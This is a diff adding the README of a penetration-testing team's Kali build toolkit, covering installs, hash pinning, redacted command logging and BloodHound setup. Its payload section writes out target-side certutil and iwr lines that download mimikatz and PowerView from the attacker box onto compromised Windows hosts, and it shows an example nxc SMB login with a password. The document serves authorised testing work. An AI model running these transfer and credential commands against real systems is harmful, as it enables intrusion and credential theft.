@@ -1,0 +1,320 @@
+# PSUT VAPT Team — Engagement Toolkit
+
+Build scripts for a penetration-testing engagement platform: tooling, plus an
+**evidence layer** that produces a timestamped, credential-redacted record of what
+the team actually did. Targets a fresh **Kali Linux** box, with a small companion
+script for a Windows box.
+
+> **Scope note.** This repository contains build and tooling scripts only. It
+> carries no information about any competition environment, client or engagement.
+> Nothing engagement-specific is committed here, by policy.
+
+---
+
+## Quick start
+
+Run these **in order**. They call `sudo` themselves where needed, and running the
+whole thing under `sudo` is also safe — the scripts work out the operator's home
+from their own path rather than from `$HOME`, so nothing lands in `/root`.
+
+**No step asks a question.** Every `apt` call is fully non-interactive and the
+preflight reports rather than blocks, so a build can be started and left alone.
+
+```bash
+git clone <this-repo>
+cd <this-repo>
+
+bash start.sh      # base packages, docker, desktop, the evidence layer
+# -> do the manual steps it prints, then:
+bash all.sh        # the full tool suite (~30 min)
+bash ad.sh         # AD / internal tooling
+```
+
+`all.sh` re-checks the manual steps from `start.sh`, shows exactly what is missing
+and how to fix each one, then **continues**. That matters because anything you run
+before command logging is live is absent from the activity log — so fix the items it
+lists, but the build does not wait for you. `STRICT_PREFLIGHT=1` makes a failure
+abort instead; `SKIP_PREFLIGHT=1` skips the checks.
+
+`all.sh` also installs **Burp Suite Community** (PortSwigger's latest, ~650 MB) and
+*then* wires in the logging extension — that order is required, because
+`burp_logging.sh` patches a config file Burp only writes once it exists.
+
+The jVision server can be brought up in a second terminal while `all.sh` runs —
+`start.sh` installs Docker specifically so that is possible (`all.sh` holds the apt
+lock for its whole package phase).
+
+### Roles
+
+There is exactly one role flag:
+
+```bash
+bash all.sh            # full standard suite
+bash all.sh --ismael   # the above + mobile kit + nuclei-templates  (~2.3 GB extra)
+bash all.sh --help
+```
+
+Deliberately the only one: splitting further costs more in "which flag do I need
+again?" than it saves in bandwidth. ⚠️ If nobody runs `--ismael`, nobody has nuclei
+templates offline — `nuclei` downloads them on first use, which fails without
+egress.
+
+### Lost a box mid-engagement
+
+```bash
+bash smol-all.sh              # core + web + AD, ~3-6 min
+bash smol-all.sh --web        # core + web only
+bash smol-all.sh --ad         # core + AD only
+bash smol-all.sh --no-burp    # skip the heaviest package
+```
+
+Installs only the critical path and **re-arms the evidence layer**, which a rebuilt
+box otherwise has none of. It is self-contained on purpose — no sourcing of
+`lib.sh` — so it still runs if the clone on a freshly rebuilt box is partial.
+
+### Windows box
+
+```powershell
+powershell -ep bypass
+.\windows.ps1                  # -SkipDefender / -SkipBloodHound
+```
+
+⚠️ **Needs internet. Run it during prep, not on engagement morning.**
+
+---
+
+## What's in here
+
+| File | Purpose |
+|---|---|
+| `start.sh` | Bootstrap: base packages, Docker, XFCE + xRDP, and the evidence layer |
+| `all.sh` | Full tool suite, gated by a preflight check; ends with a verification pass |
+| `ad.sh` | AD/internal tooling, the Windows payload set, both BloodHound collectors |
+| `smol-all.sh` | Emergency rebuild — critical path only |
+| `lib.sh` | Shared helpers **and the artifact pin manifest** (sourced by `all.sh`/`ad.sh`) |
+| `pins.sh` | Record / verify the pinned sha256 values |
+| `windows.ps1` | Windows box: Burp, Snaffler, BloodHound 4.3.1 + Neo4j 4.4 |
+| `command_logging.sh` | Timestamped, credential-redacted shell log (zsh + bash) |
+| `burp_logging.sh`, `burp_logger.py` | Burp extension logging HTTP traffic to a readable file (run by `all.sh`, after Burp) |
+| `terminal_uniform.sh` | Identical terminal appearance across the team, for screenshots |
+| `redaction_test.sh` | Proves both redactors strip secrets and keep identities |
+| `jvis_logsync.sh`, `jvis_logsync.py` | Push both readable logs to the jVision server |
+| `TOOLS.md` | Full tool inventory with measured download/disk weight |
+| `REHEARSAL.md` | **How to rehearse a build so it proves something.** Read before building. |
+
+---
+
+## The evidence layer
+
+This is the part that distinguishes the repo from a list of `apt install` lines. It
+answers one question: *prove what this team did at time T.*
+
+| Artifact | Written by | Path |
+|---|---|---|
+| Readable command log | `command_logging.sh` | `~/.zsh_history_readable` |
+| Burp HTTP log | `burp_logger.py` | `~/.burp_history_readable` |
+| Uniform terminal | `terminal_uniform.sh` | qterminal + xfce4-terminal configs |
+
+Each command log line is `<time> (exit <code>) <command>`.
+
+**Redaction policy: every secret is redacted, every username is kept in full.**
+Passwords, NTLM/LM hashes, Kerberos keys and tickets, and web secrets
+(`Authorization`/`Cookie`/API-key headers, `--token`, basic auth, `password=` in
+bodies and JSON) become `[REDACTED]`. Usernames, domains, hostnames and IPs are
+kept deliberately — the log exists so someone can answer "which account touched
+this host at time T", and a masked username defeats the only question it is there
+to answer. **The command still runs unmodified; only the logged text is scrubbed.**
+
+The terminal uniform pins all 16 ANSI colours, not just foreground/background, so
+coloured tool output renders identically on both emulators. The palette is tuned
+for colour-vision deficiency: every colour clears 5.6:1 contrast on black under
+normal, protan, deutan and tritan vision, with the four status colours held ≥ dE00
+25 apart. Screenshots end up in a report, so this is legibility for the reader too.
+
+Verify it works, don't assume:
+
+```bash
+bash redaction_test.sh          # both redactors, one shared battery of real cases
+bash redaction_test.sh -v       # show every case and what it redacts to
+```
+
+That test exists because the two redactors enforce the same policy in different
+languages against different input, and **they had already drifted** — one of them
+was logging `pass=` in clear while the other redacted it, and seven installed
+tools were leaking `-p <password>` because the shell side gates that flag behind a
+tool allowlist they were missing from. Run it after touching either redactor.
+
+Then confirm it live:
+
+```bash
+source ~/.zshrc                                       # or open a fresh shell
+nxc smb 10.0.0.1 -u administrator -p 'Summer2026!'
+cat ~/.zsh_history_readable
+#  -> -u administrator       kept in full
+#  -> -p [REDACTED]          secret gone
+```
+
+---
+
+## Reproducible builds: the pin manifest
+
+Every third-party artifact the scripts download is declared in one place in
+`lib.sh` with the version intended and the sha256 expected.
+
+The problem it solves: when half of these track `latest`/`master`/`@latest`, two
+operators building on the same morning get different binaries, "it worked on my
+box" stops meaning anything, and an upstream release can land mid-engagement
+without anyone choosing it. A repository freeze gives you *script* stability; this
+manifest is what gives you *artifact* stability.
+
+```bash
+bash pins.sh --show                      # what is pinned, what tracks a moving target
+bash pins.sh --record                    # download everything, print the real hashes
+bash pins.sh --write                     # same, but edit lib.sh in place (backup kept)
+bash pins.sh --verify                    # drift check — run the week before the event
+bash pins.sh --audit                     # is THIS box built from the manifest? (no network)
+bash pins.sh --write mimikatz pstools    # narrow the run to named artifacts
+```
+
+`--verify` and `--audit` answer different questions. `--verify` re-downloads and
+asks *"did upstream move?"*. `--audit` re-hashes the files `~/pins.lock` says
+landed on this box and asks *"is this box actually what we pinned?"* — run that on
+arrival and after any `smol-all.sh` rebuild.
+
+Hashes ship as `TBD`, meaning **unverified**. That is deliberate: a hash nobody
+computed is worse than no hash, because it looks like verification while verifying
+nothing. Fill them in during a rehearsal on a trusted network and commit the
+result. Until then, every unpinned artifact is reported at the end of a run instead
+of being silently accepted.
+
+Each box also writes `~/pins.lock` recording what it *actually* downloaded.
+**Diff that file between two operators' boxes — any difference is a build that will
+not reproduce.**
+
+A handful of artifacts have no pinnable upstream (archived repos with no tags,
+vendor "current" download URLs). Those stay on `master`/`current` and are reported
+as unpinned. That is upstream's constraint, not an oversight.
+
+---
+
+## ⚠️ Two BloodHound stacks — do not mix collections
+
+The build runs **both** BloodHound generations, because neither alone covers the
+need. Mixing their collections **fails at ingest** rather than degrading
+gracefully, so the collectors are installed into separate directories.
+
+| Viewer | Where | Fed by |
+|---|---|---|
+| **BloodHound CE 9.4.0** | Kali — `sudo bloodhound-start` | `bloodhound-ce-python`, `~/dropzone/windows/ce/SharpHound.exe` (2.x), `azurehound` |
+| **BloodHound 4.3.1 (legacy)** | Windows box — `windows.ps1` | `bloodhound-python`, `~/dropzone/windows/legacy/SharpHound.exe` (1.x) |
+
+Why both:
+
+- **CE cannot run on the Windows box.** CE is a Docker Compose stack whose only
+  documented Windows install path is Docker Desktop, and Docker Desktop is
+  unsupported on every edition of Windows Server. So an on-box viewer has to be
+  legacy.
+- **CE cannot be dropped from Kali.** AzureHound v3 emits CE format only, and
+  having cloud and on-prem paths in one graph is the whole reason AzureHound is
+  installed. Legacy 4.3.1 cannot ingest it.
+
+Neo4j on Windows is pinned to **4.4.19** — the version BloodHound 4.3.1's own
+release notes name. Neo4j 5.x has a severe BloodHound ingest performance
+regression. Do not install Neo4j from Chocolatey; that package tracks 5.x.
+
+---
+
+## The Windows payload set
+
+`ad.sh` builds `~/dropzone/windows/` on **Kali**. These are payloads **uploaded to
+compromised Windows targets** — they are not installed on our own Windows box. The
+directory is a flat HTTP root on purpose, so the transfer line stays short:
+
+```bash
+cd ~/dropzone/windows && python3 -m http.server 9999
+#   target>  certutil -urlcache -split -f http://<kali>:9999/mimikatz.exe m.exe
+#   target>  iwr -UseBasicParsing http://<kali>:9999/PowerView.ps1 -OutFile pv.ps1
+
+# or over SMB:
+impacket-smbserver -smb2support share ~/dropzone/windows
+```
+
+Every item is version-pinned and hash-verifiable through the manifest, and the
+verification pass checks each one is a real PE or script rather than a
+captive-portal login page saved with a 200 status.
+
+---
+
+## Where things land
+
+| Path | What |
+|---|---|
+| `~/dropzone/` | Clones and downloaded payloads |
+| `~/dropzone/windows/` | Windows payload set (flat HTTP root) |
+| `~/dropzone/windows/legacy/` · `~/dropzone/windows/ce/` | The two SharpHound generations, kept apart |
+| `~/dropzone/privesc/` | linpeas / winpeas / PowerUp / PrivescCheck |
+| `/usr/local/bin/` | `chisel`, `upshell`, `kerbrute`, `windapsearch`, `azurehound`, `ligolo-proxy` |
+| `~/go/bin/` | `httpx`, `httprobe`, `subfinder`, `waybackurls` |
+| `/usr/share/wordlists/` · `/usr/share/seclists/` | Wordlists |
+| `~/.BurpSuite/` | Jython jar + the logging extension |
+| `/opt/burpsuite/` | Burp jar + `VERSION`; launcher at `/usr/local/bin/burpsuite` |
+| `~/pins.lock` | What this box actually downloaded |
+
+### Logs
+
+| File | From |
+|---|---|
+| `~/start_install.log` | `start.sh` |
+| `~/all_install.log` | `all.sh` |
+| `~/ad_install.log` | `ad.sh` |
+| `~/smol_install.log` | `smol-all.sh` |
+| `~/windows_install.log` | `windows.ps1` |
+
+---
+
+## After installing
+
+**Log out and back in.** Several things only take effect on a fresh login:
+
+- command logging (new shells load the `~/.zshrc` / `~/.bashrc` hooks)
+- the uniform terminal look (applies to new windows)
+- docker group membership (run docker without `sudo`)
+- `PATH` for `~/go/bin` and `~/.local/bin`
+
+Then read the **verification summary** each script prints, line by line. Every FAIL
+and WARN is a finding. Verification *runs* each tool rather than just locating it,
+so a FAIL means the tool genuinely does not work — don't wave any of them through.
+
+---
+
+## Before relying on any of this
+
+Read **`REHEARSAL.md`** and do a real rehearsal. The short version:
+
+1. **Fresh VM snapshot every time.** Half of what these scripts do is edit dotfiles
+   and system config, and those edits are guarded — a second run down a guarded
+   path proves nothing about the first.
+2. **The user must not be named `kali`.** A hardcoded `/home/kali` path once
+   survived every rehearsal because the practice VM's user happened to be `kali`.
+   Half the installs landed in the wrong directory and verification then reported
+   NOT FOUND for tools that had installed fine.
+3. **Rehearse on the network you will have**, not your home connection.
+4. **Two people, two boxes, same morning.** Divergence between them is the finding.
+
+Then record the wall times, the PASS/WARN/FAIL counts, and the pin summary.
+
+---
+
+## Conventions for contributors
+
+- **Tool changes go in `TOOLS.md` in the same commit.** That file is generated by
+  hand from the install lines; if it drifts it stops being usable.
+- **Add shared helpers to `lib.sh`, not to each script.** The helpers were once
+  copy-pasted into every installer, and a fix applied to one copy never reached the
+  others — with nothing anywhere reporting the divergence. `smol-all.sh` is the one
+  deliberate exception.
+- **Every new download goes in the pin manifest.** Not inline `curl`.
+- **Comment the failure a line prevents, not what it does.** `apt install` is self
+  explanatory; `sudo env DEBIAN_FRONTEND=noninteractive` is not, and the reason it
+  is there is the thing worth writing down.
+- **New tools need a verification check**, and the check must run the tool.
